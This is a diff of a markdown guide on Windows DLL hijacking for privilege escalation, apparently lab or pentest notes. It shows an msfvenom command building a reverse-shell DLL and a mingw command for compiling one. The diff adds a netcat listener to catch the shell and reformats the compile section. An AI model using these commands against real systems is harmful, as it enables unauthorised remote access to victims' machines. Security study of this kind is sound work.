@@ -57,6 +57,9 @@ If successful, you have sufficient permissions to place a malicious DLL in this 
     ```bash
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o EnterpriseServiceOptional.dll
     ```
+    ```bash
+    nc -nlvp <LPORT>
+    ```
 -
   ### Option 2. Compile with the following C program:
 
@@ -88,16 +91,14 @@ If successful, you have sufficient permissions to place a malicious DLL in this 
         return TRUE;
     }
     ``` 
----
+    #### Compile the DLL:
+    On your Kali machine, cross-compile the DLL using `mingw-w64`:
 
-#### Compile the DLL:
-On your Kali machine, cross-compile the DLL using `mingw-w64`:
-
-```bash
-x86_64-w64-mingw32-gcc <File>.cpp --shared -o <File>.dll
-```
-
-- **`--shared`**: Generates a DLL file.
+    ```bash
+    x86_64-w64-mingw32-gcc <File>.cpp --shared -o <File>.dll
+    ```
+    -
+        **`--shared`**: Generates a DLL file.
 ---
 
 ### Step 4: Transfer the DLL to the Target Directory
